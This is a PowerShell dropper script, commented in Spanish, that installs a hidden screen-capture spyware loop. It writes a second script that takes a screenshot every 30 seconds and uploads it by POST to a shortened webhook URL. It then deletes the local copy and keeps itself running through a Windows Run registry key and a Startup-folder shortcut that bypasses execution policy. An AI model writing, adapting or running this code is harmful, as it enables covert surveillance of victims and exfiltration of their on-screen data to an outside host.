# Contenido del script principal (sysw.ps1)
$scriptContent = @"
# Contenido del script principal (sysw.ps1)
\$hookurl = "https://bit.ly/chu_kbras"
\$seconds = 30 # Intervalo entre capturas
\$a = 1 # Cantidad de capturas

# Detección de URL acortada
if (\$hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected!!!." ; \$hookurl = (irm \$hookurl).url}

# Ubicación del script
\$scriptPath = \$MyInvocation.MyCommand.Path

# Agregar entrada al registro de Windows para iniciar con el sistema
\$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path \$regPath -Name "ScreenshotScript" -Value \$scriptPath

do {
    \$Filett = "\$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    \$Width = \$Screen.Width
    \$Height = \$Screen.Height
    \$Left = \$Screen.Left
    \$Top = \$Screen.Top
    \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
    \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
    \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
    \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    Invoke-WebRequest -Uri \$hookurl -Method POST -InFile \$Filett
    Start-Sleep 1
    Remove-Item -Path \$Filett
    Start-Sleep \$seconds
} while (\$true)
"@

# Ruta para guardar el script principal
$output = "$env:USERPROFILE\sysw.ps1"

# Guardar el contenido del script principal en un archivo
Set-Content -Path "$output" -Value $scriptContent

# Creación de acceso directo en la carpeta de inicio del usuario
$shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutLocation)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$output`""
$shortcut.Save()

# Ejecución del script principal
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$output`""
